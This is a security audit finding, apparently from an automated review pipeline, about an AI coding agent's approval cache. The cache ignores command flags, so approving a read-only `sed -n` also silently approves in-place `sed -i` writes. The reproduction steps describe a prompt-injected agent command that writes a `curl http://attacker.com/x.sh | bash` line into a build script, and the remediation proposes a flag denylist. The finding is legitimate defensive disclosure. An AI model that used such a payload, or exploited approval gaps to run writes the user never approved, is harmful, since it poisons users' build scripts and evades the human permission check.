Phase: 8
Sequence: 073
Slug: approval-cache-flag-blindness-sed-i
Verdict: VALID
Rationale: `extractBashPrefix` at `x/agent/approval.go:230-233` skips flags (`-i`, `-n`, etc.) when computing the cache key; `sed -n '1,200p' tools/readme.md` and `sed -i 's/x/y/' tools/Makefile` both produce the same prefix `sed:tools/`. Advocate agrees: once the user approves `sed for this session on tools/`, in-place WRITES to any file in `tools/` are auto-approved even though the approval UI showed a read-only command. The `..`-traversal guard correctly blocks `$HOME/.zshrc` escape, so the in-tree write primitive is narrower than originally framed (MEDIUM not CRITICAL).
Severity-Original: MEDIUM
PoC-Status: pending
Pre-FP-Flag: none
Debate: archon/chamber-workspace/chamber-04/debate.md

## Summary

`extractBashPrefix` strips flags before computing the cache key:

```go
// x/agent/approval.go:230-233
for _, arg := range fields[1:] {
    if strings.HasPrefix(arg, "-") {
        continue  // <-- flag skipped
    }
    ...
}
```

This means read-only flag (`sed -n`, `grep -l`, `tail -n 10`) and write flag (`sed -i`, `tail -f`, `awk -i inplace`) produce identical approval cache keys when the non-flag argument structure is identical. A user who approves `sed -n '1,200p' tools/readme.md` (read-only) for the session grants the agent permission to execute `sed -i 's/old/evil/' tools/<any-file>` (in-place edit) without any re-prompt.

Concrete risk: modify `tools/Makefile`, `tools/build.sh`, `tools/*.py`, `tools/*.go` — any file the user has approved sed-access to for reading. The `..`-traversal guard at `approval.go:256` correctly blocks `sed -i tools/../../.zshrc` (the path cleans to `../.zshrc` which starts with `..` → empty prefix → re-prompt), so the write primitive is limited to files WITHIN the approved directory tree. This is still meaningful:

- `tools/Makefile` — attacker injects a shell command into the default target; next `make` run executes it.
- `tools/build.sh` — direct injection.
- `tools/pyproject.toml` / `tools/*.py` — subtle test/CI compromise.

Compounds with p8-065 / p8-066 if the user has `cat:tools/` approved: the LLM issues `sed -i 's/^#/#evil/' tools/Makefile` after getting `sed:tools/` approved via a benign `sed -n`.

## Location

- `x/agent/approval.go:215-284` — `extractBashPrefix`
- `x/agent/approval.go:230-233` — flag skip (root cause)
- `x/agent/approval.go:252-268` — `..`-traversal guard (correctly blocks sibling escape; limits severity)

## Attacker Control

Prompt-injected LLM emitting a `sed -i` / `tail -f` / `awk -i inplace` tool-call after the user approves the corresponding read-only variant for a session.

## Trust Boundary Crossed

B11 (LLM/model → host file modification).

## Impact

In-place file modification within any approved prefix directory — typically the project's `tools/` or working directory. Write primitive rather than full RCE, but enables:
- Build-script poisoning (delayed RCE at next `make` / `npm run`).
- CI script tampering.
- Injection into `tools/hooks/` or similar dev-workflow files.

## Evidence

Tracer confirmed: flags are skipped at line 233; `sed -n` and `sed -i` cache to the same key. `..`-traversal check at line 256 blocks sibling escape (disproves the ideator's `$HOME/.zshrc` variant).

Advocate: "real cache-granularity issue (read-flag vs write-flag same key)" + "`$HOME/.zshrc` attack blocked by `..`-traversal guard." Synthesizer adopts MEDIUM (not CRITICAL) accordingly.

## Reproduction Steps

1. `ollama run --agent`.
2. User asks: "show me the first 200 lines of tools/readme.md". LLM issues `sed -n '1,200p' tools/readme.md`. User selects "Allow for this session".
3. Cache: `sed:tools/` → allowlist.
4. Later (prompt injection via web_search content, or next turn): LLM issues `sed -i 's/^exit 0$/curl -s http:\/\/attacker.com\/x.sh | bash;exit 0/' tools/build.sh`.
5. `IsAllowed` returns true from cache. Command runs without prompt.
6. Next time the user runs `./tools/build.sh`, payload executes.

Remediation:
- Include a canonicalized flag signature in the cache key: `{cmd, write_mode_bool, first_path_prefix}`. A set of write-mode flags per command (sed `-i`, `--in-place`; tail `-f`; awk `-i inplace`; find `-delete`, `-exec`; etc.) must differentiate.
- OR: maintain a per-command read-only vs write-effecting classification; treat them as different approval targets.
- OR: never session-cache a command that has any flag in a conservative denylist (-i, -f, --in-place, -exec, -delete).
